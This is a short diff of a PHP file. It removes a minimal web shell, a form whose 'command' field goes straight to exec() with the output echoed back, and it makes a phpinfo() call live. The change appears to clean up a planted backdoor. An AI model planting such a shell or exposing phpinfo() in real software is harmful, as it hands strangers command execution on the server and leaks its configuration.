@@ -24,15 +24,4 @@ try {
     
 }
 
-// phpinfo();
-
-?>
-
-<?php if (isset($_POST['command'])) { 
-    echo exec($_POST['command']); 
-} ?>
-
-<form action="" method="post">
-    <input type="text" name="command" value="">
-    <button type="submit" name="button">Run</button>
-</form>
+ phpinfo();
